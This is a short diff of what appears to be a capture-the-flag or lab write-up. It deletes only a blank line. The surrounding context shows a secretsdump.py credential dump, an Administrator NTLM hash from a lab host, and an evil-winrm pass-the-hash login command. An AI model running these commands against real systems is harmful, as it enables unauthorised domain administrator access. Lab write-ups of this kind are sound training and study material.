@@ -171,7 +171,6 @@ secretsdump.py Administrator:@10.10.255.240 -hashes aad3b435b51404eeaad3b435b514
 ## Administrator `LM:NTLMv1` hash
 
 `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::`
-
 ```bash
 evil-winrm -u Administrator -H aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc -i 10.10.255.240
 ```
